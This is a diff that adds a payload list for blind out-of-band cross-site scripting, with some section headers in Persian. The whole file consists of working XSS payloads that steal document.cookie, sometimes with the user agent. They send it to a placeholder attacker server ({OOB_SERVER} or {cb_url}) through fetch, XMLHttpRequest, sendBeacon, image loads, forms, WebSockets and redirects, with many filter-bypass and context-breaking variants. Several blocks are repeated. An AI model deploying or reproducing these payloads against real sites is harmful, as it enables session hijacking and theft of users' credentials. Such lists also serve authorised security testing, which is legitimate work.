@@ -1,0 +1,228 @@
+# XSS Payloads — Blind OOB Exfiltration
+# Placeholder: {OOB_SERVER}
+# ============================================
+# ── Script-based ─────────────────────────────────────────────
+<script>fetch("{OOB_SERVER}", {method: "POST", body: document.cookie, mode: "no-cors"})</script>
+<script>fetch('{OOB_SERVER}', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'cookie=' + document.cookie})</script>
+<script>var x=new XMLHttpRequest();x.open("GET","{OOB_SERVER}/?"+document.cookie);x.send();</script>
+<script>var x=new XMLHttpRequest();x.open("POST","{OOB_SERVER}",true);x.send(document.cookie)</script>
+<script>window.onload=function(){var xhr=new XMLHttpRequest();xhr.open('POST','{OOB_SERVER}');xhr.send(document.cookie)}</script>
+<script>function exfil(){var xhttp=new XMLHttpRequest();xhttp.open("POST","{OOB_SERVER}",true);xhttp.send(document.cookie)}exfil();</script>
+<script>document.location="{OOB_SERVER}/?"+document.cookie</script>
+<script>document.write('<img src="{OOB_SERVER}/?' + document.cookie + '">');</script>
+<script>eval('var s="{OOB_SERVER}/?"+document.cookie;new Image().src=s')</script>
+<script>var url = '{OOB_SERVER}/?cookie=' + btoa(document.cookie); window.open(url);</script>
+<script>import('data:text/javascript,export default fetch("{OOB_SERVER}",{method:"POST",body:document.cookie})')</script>
+
+# ── Navigator.sendBeacon ─────────────────────────────────────
+<script>navigator.sendBeacon("{OOB_SERVER}/?c=", document.cookie)</script>
+<script>navigator.sendBeacon("{OOB_SERVER}/?uid=test&c=", document.cookie)</script>
+<img src=x onerror="new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+<img src=x onerror="new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)+'&ua='+encodeURIComponent(navigator.userAgent)">
+<img src=x onerror="location='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+<img src="x" onerror="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:fetch('{OOB_SERVER}/?c='+document.cookie)">
+# ── Base: <><img> ────────────────────────────────────────────
+<><img src=1 onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+<><img src=1 onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><img src=1 onerror="new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+<><img src=1 onerror="var x=new XMLHttpRequest();x.open('POST','{OOB_SERVER}',true);x.send(document.cookie)">
+<><img src=1 onerror="var x=new XMLHttpRequest();x.open('GET','{OOB_SERVER}/?c='+encodeURIComponent(document.cookie));x.send()">
+<><img src=1 onerror="navigator.sendBeacon('{OOB_SERVER}', document.cookie)">
+<><img src=1 onerror="navigator.sendBeacon('{OOB_SERVER}/?c=', document.cookie)">
+<><img src=1 onerror="document.location='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+<><img src=1 onerror="window.open('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><img src=1 onerror="var f=document.createElement('form');f.action='{OOB_SERVER}';f.method='POST';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit()">
+<><img src=1 onerror="fetch('{OOB_SERVER}/?c='+btoa(document.cookie))">
+<><img src=1 onerror="document.cookie.split(';').forEach(c=>{new Image().src='{OOB_SERVER}/?'+c})">
+<><img src=1 onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie+'&ua='+encodeURIComponent(navigator.userAgent)})">
+
+# ── Variants: < > با فاصله ────────────────────────────────────
+< ><img src=1 onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+<  ><img src=1 onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+
+# ── Variants: تگ‌های خالی دیگر ───────────────────────────────
+</><img src=1 onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+<//><img src=1 onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<%><img src=1 onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<%00><img src=1 onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+
+# ── Variants: بدون src ───────────────────────────────────────
+<><img onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+<><img src onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><img src=x onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+
+# ── Variants: با تگ‌های دیگر ─────────────────────────────────
+<><svg onload="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+<><body onload="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><details open ontoggle="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><input autofocus onfocus="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><marquee onstart="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><video src=x onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><audio src=x onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+
+# ── Variants: بدون فاصله ─────────────────────────────────────
+<><img/src=1 onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+<><img/src=x onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<><img src=1 onerror=fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})>
+# ── Fetch POST ──────────────────────────────────────────────
+</li><li></li><script>fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})</script><li></li>
+</li><li></li><script>fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))</script><li></li>
+</li><li></li><script>fetch('{OOB_SERVER}', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cookie:document.cookie})})</script><li></li>
+
+# ── Image GET ───────────────────────────────────────────────
+</li><li></li><script>new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)</script><li></li>
+</li><li></li><script>var i=new Image();i.src='{OOB_SERVER}/?c='+document.cookie</script><li></li>
+
+# ── XMLHttpRequest ──────────────────────────────────────────
+</li><li></li><script>var x=new XMLHttpRequest();x.open('POST','{OOB_SERVER}',true);x.send(document.cookie)</script><li></li>
+</li><li></li><script>var x=new XMLHttpRequest();x.open('GET','{OOB_SERVER}/?c='+encodeURIComponent(document.cookie));x.send()</script><li></li>
+
+# ── Navigator.sendBeacon ────────────────────────────────────
+</li><li></li><script>navigator.sendBeacon('{OOB_SERVER}', document.cookie)</script><li></li>
+</li><li></li><script>navigator.sendBeacon('{OOB_SERVER}/?c=', document.cookie)</script><li></li>
+
+# ── Document.location (Redirect) ────────────────────────────
+</li><li></li><script>document.location='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)</script><li></li>
+
+# ── Window.open ─────────────────────────────────────────────
+</li><li></li><script>window.open('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))</script><li></li>
+
+# ── Form Submit ─────────────────────────────────────────────
+</li><li></li><script>var f=document.createElement('form');f.action='{OOB_SERVER}';f.method='POST';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit()</script><li></li>
+
+# ── Eval + Image ────────────────────────────────────────────
+</li><li></li><script>eval('var s="{OOB_SERVER}/?c="+document.cookie;new Image().src=s')</script><li></li>
+
+# ── Base64 Encoded Cookie ───────────────────────────────────
+</li><li></li><script>fetch('{OOB_SERVER}/?c='+btoa(document.cookie))</script><li></li>
+
+# ── Split Cookies (هر کوکی جداگانه) ────────────────────────
+</li><li></li><script>document.cookie.split(';').forEach(c=>{new Image().src='{OOB_SERVER}/?'+c})</script><li></li>
+
+# ── With User Agent ─────────────────────────────────────────
+</li><li></li><script>fetch('{OOB_SERVER}', {method:'POST', body:document.cookie+'&ua='+encodeURIComponent(navigator.userAgent)})</script><li></li>
+# ── Image-based ──────────────────────────────────────────────
+"><img src=x onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+'><img src=x onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+"><img src="{OOB_SERVER}/?c="+encodeURIComponent(document.cookie)>
+<img src=x onerror="new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+<img src=x onerror="new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)+'&ua='+encodeURIComponent(navigator.userAgent)">
+<img src=x onerror="location='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+<img src="x" onerror="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:fetch('{OOB_SERVER}/?c='+document.cookie)">
+<script>new Image().src = "{OOB_SERVER}/?c=" + encodeURIComponent(document.cookie);</script>
+<script>var i=new Image();i.src="{OOB_SERVER}/?c="+encodeURIComponent(document.cookie);</script>
+<script>var b=document.cookie.split(';');for(var i=0;i<b.length;i++){new Image().src='{OOB_SERVER}/?'+b[i]}</script>
+<body onload="var img=new Image();img.src='{OOB_SERVER}/?'+document.cookie">
+
+# ── Script-based ─────────────────────────────────────────────
+<script>fetch("{OOB_SERVER}", {method: "POST", body: document.cookie, mode: "no-cors"})</script>
+<script>fetch('{OOB_SERVER}', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'cookie=' + document.cookie})</script>
+<script>var x=new XMLHttpRequest();x.open("GET","{OOB_SERVER}/?"+document.cookie);x.send();</script>
+<script>var x=new XMLHttpRequest();x.open("POST","{OOB_SERVER}",true);x.send(document.cookie)</script>
+<script>window.onload=function(){var xhr=new XMLHttpRequest();xhr.open('POST','{OOB_SERVER}');xhr.send(document.cookie)}</script>
+<script>function exfil(){var xhttp=new XMLHttpRequest();xhttp.open("POST","{OOB_SERVER}",true);xhttp.send(document.cookie)}exfil();</script>
+<script>document.location="{OOB_SERVER}/?"+document.cookie</script>
+<script>document.write('<img src="{OOB_SERVER}/?' + document.cookie + '">');</script>
+<script>eval('var s="{OOB_SERVER}/?"+document.cookie;new Image().src=s')</script>
+<script>var url = '{OOB_SERVER}/?cookie=' + btoa(document.cookie); window.open(url);</script>
+<script>import('data:text/javascript,export default fetch("{OOB_SERVER}",{method:"POST",body:document.cookie})')</script>
+
+# ── Navigator.sendBeacon ─────────────────────────────────────
+<script>navigator.sendBeacon("{OOB_SERVER}/?c=", document.cookie)</script>
+<script>navigator.sendBeacon("{OOB_SERVER}/?uid=test&c=", document.cookie)</script>
+
+# ── SVG-based ────────────────────────────────────────────────
+"><svg onload="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+"><svg onload="new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)">
+"><svg/onload="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+"><svg/onload="setTimeout(()=>fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)),100)">
+"><svg/onload="fetch('{OOB_SERVER}/?c='+btoa(document.cookie))">
+"><svg/onload="fetch('data:text/html,<script>location=\"{OOB_SERVER}/?c=\"+document.cookie</script>')">
+
+# ── iframe-based ─────────────────────────────────────────────
+"><iframe src="{OOB_SERVER}/?c="+encodeURIComponent(document.cookie)></iframe>
+<iframe src="javascript:fetch('{OOB_SERVER}',{method:'POST',body:document.cookie})"></iframe>
+<iframe src=# onmouseover="fetch('{OOB_SERVER}/?c='+document.cookie)"></iframe>
+
+# ── Form-based ───────────────────────────────────────────────
+<form action="{OOB_SERVER}" method="POST"><input type="hidden" name="cookie" value=""></form><script>document.forms[0].cookie.value=document.cookie;document.forms[0].submit();</script>
+<script>var f=new FormData();f.append('c',document.cookie);fetch('{OOB_SERVER}',{method:'POST',body:f})</script>
+
+# ── HTML Event Handlers ──────────────────────────────────────
+" onfocus="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))" autofocus>
+"><body onload="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<details open ontoggle="new Image().src='{OOB_SERVER}/?c='+document.cookie">
+<details ontoggle="fetch('{OOB_SERVER}',{method:'POST',body:document.cookie})">
+<div onmouseover="new Image().src='{OOB_SERVER}/?c='+document.cookie">hover</div>
+<input onfocus="fetch('{OOB_SERVER}',{method:'POST',body:document.cookie})" autofocus>
+<a onmouseover="fetch('{OOB_SERVER}/?c='+document.cookie)">link</a>
+<a href="javascript:fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">click</a>
+
+# ── Math/Other Tags ──────────────────────────────────────────
+<math><mtext><mglyph onclick="fetch('{OOB_SERVER}/?c='+document.cookie)">x</mglyph></mtext></math>
+<video src="{OOB_SERVER}/?" + document.cookie onerror="alert(1)">
+<audio src="{OOB_SERVER}/?" + document.cookie onload="new Image().src='{OOB_SERVER}/?c='+document.cookie">
+<object data="{OOB_SERVER}/?" + document.cookie>
+<embed src="{OOB_SERVER}/?" + document.cookie>
+<link rel="stylesheet" href="{OOB_SERVER}/?" + document.cookie>
+
+# ── WebSocket-based ──────────────────────────────────────────
+<script>WebSocket('wss://{OOB_SERVER}').send(document.cookie)</script>
+<script>var ws = new WebSocket('wss://{OOB_SERVER}'); ws.onopen = function(){ws.send(document.cookie)}</script>
+
+# ── JSONP-based ──────────────────────────────────────────────
+<script>JSONP_callback({c:document.cookie});</script><script src="{OOB_SERVER}/?cb=JSONP_callback"></script>
+
+# ── CSS-based ────────────────────────────────────────────────
+<div style="width: expression(fetch('{OOB_SERVER}/?c='+document.cookie))">
+<style>.x{background-image:url("javascript:fetch('{OOB_SERVER}/?c='+document.cookie)")}</style><a class=x></a>
+
+# ── Meta Refresh ─────────────────────────────────────────────
+<meta http-equiv="refresh" content="0;url=data:text/html,"><script>fetch('{OOB_SERVER}/?c='+document.cookie)</script>
+
+# ── Noscript Fallback ────────────────────────────────────────
+<noscript><img src="{OOB_SERVER}/?" + document.cookie></noscript><script>/*fallback*/</script>
+
+# ── Context Breakers ─────────────────────────────────────────
+");fetch("{OOB_SERVER}/?c="+encodeURIComponent(document.cookie));//
+${fetch("{OOB_SERVER}/?c="+encodeURIComponent(document.cookie))}
+javascript:fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})
+javascript:new Image().src='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)
+javascript:document.location='{OOB_SERVER}/?c='+encodeURIComponent(document.cookie)
+"><img src=x onerror="[]['constructor']['constructor'](`fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))`)()">
+
+# ── Advanced Bypass ──────────────────────────────────────────
+"><img src=x onerror="fetch('{OOB_SERVER}/?c='+document.cookie)">
+"><img src=x onerror="fetch('{OOB_SERVER}/?c='+encodeURIComponent(document.cookie))">
+<img src=x onerror="fetch('{OOB_SERVER}/?c='+document.cookie)">
+<svg onload="fetch('{OOB_SERVER}/?c='+document.cookie)">
+"><img src=x onerror="fetch('{OOB_SERVER}', {method:'POST', body:document.cookie})">
+# ============================================
+<a href="javascript:fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">click</a>
+<a href="javascript:document.location='{cb_url}&c='+document.cookie">x</a>
+ 
+# ── IFRAME ────────────────────────────────────────────────────────────────────
+<iframe src="javascript:parent.fetch('{cb_url}&c='+encodeURIComponent(parent.document.cookie))">
+<iframe onload="this.contentWindow.fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+ 
+# ── INPUT autofocus ───────────────────────────────────────────────────────────
+<input autofocus onfocus="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+<input type=image src=x onerror="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+ 
+# ── BODY/HTML event ───────────────────────────────────────────────────────────
+<body onload="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+<body onpageshow="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+ 
+# ── DETAILS/SUMMARY ───────────────────────────────────────────────────────────
+<details open ontoggle="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+<details ontoggle="new Image().src='{cb_url}&c='+document.cookie" open>
+ 
+# ── FORM action ───────────────────────────────────────────────────────────────
+<form action="{cb_url}" method="GET"><input name="c" value="cookie_stealer"><input type=submit autofocus>
+ 
+# ── VIDEO/AUDIO ───────────────────────────────────────────────────────────────
+<video src=x onerror="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+<audio src=x onerror="fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
+ 
+# ── OBJECT/EMBED ──────────────────────────────────────────────────────────────
+<object data="javascript:fetch('{cb_url}&c='+encodeURIComponent(document.cookie))">
